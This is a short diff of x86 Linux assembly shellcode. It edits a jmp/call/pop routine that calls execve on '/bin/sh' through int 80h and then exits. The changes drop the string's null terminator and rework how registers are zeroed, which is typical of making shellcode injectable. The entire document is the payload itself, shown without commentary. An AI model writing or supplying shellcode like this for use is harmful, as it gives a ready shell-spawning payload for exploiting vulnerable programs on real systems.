@@ -12,12 +12,11 @@ sc:
 	mov ecx,esp
 	pop ebx
 	xor eax,eax
-	mov [esp+4],eax
-	mov [esp+8],eax
-	mov [ebx+7], eax
+	mov [ebx+7],eax
 	mov dl,0xb
 	mov al,dl
-	lea edx, [ebx+7]
+	xor edx,edx
+	mov [esp],edx
 	int 80h
 	xor ebx,ebx
 	mov eax,ebx
@@ -25,4 +24,4 @@ sc:
 	int 80h
 sh:
 	call sc
-	db "/bin/sh",0x0
+	db "/bin/sh"
